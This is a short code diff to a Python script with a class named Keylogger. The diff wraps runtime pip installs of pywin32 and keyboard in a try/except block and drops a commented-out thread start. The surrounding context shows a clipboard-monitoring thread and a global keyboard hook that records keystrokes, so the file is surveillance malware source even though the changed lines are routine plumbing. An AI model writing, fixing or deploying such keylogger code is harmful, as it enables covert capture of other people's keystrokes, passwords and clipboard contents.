@@ -6,10 +6,13 @@ from datetime import datetime
 import subprocess
 import sys
 
-subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"], check=True)
-subprocess.run([sys.executable, "-m", "pip", "install", "keyboard"], check=True)
+try:
+    subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"], check=True)
+    subprocess.run([sys.executable, "-m", "pip", "install", "keyboard"], check=True)
 
-import win32clipboard
+    import win32clipboard
+except ModuleNotFoundError as err:
+    print(f"Module not found: {err}" )
 import keyboard  
 import time
 import threading
@@ -31,7 +34,6 @@ class Keylogger:
         self.clip_thread.start()
         # Start a thread to track the keyboard
         self.key_thread = keyboard.hook(self.keyboard_tracker)
-        #self.key_thread.start()
 
     def clipboard_tracker(self):
         """
